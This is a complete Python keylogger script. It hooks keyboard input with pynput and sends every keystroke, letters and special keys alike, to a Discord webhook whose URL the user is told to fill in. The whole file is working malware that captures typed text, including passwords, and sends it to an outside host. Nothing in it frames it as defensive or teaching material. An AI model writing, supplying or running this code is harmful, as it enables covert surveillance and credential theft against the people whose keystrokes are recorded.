from pynput import keyboard
from dhooks import Webhook

log_send = Webhook('enter your webhook url here')
def on_press(key):
    try:
        log_send.send('```alphanumeric key {0} pressed```'.format(
            key.char))
    except AttributeError:
        log_send.send('```special key {0} pressed```'.format(
            key))

with keyboard.Listener(
        on_press=on_press,
        ) as listener:
    listener.join()

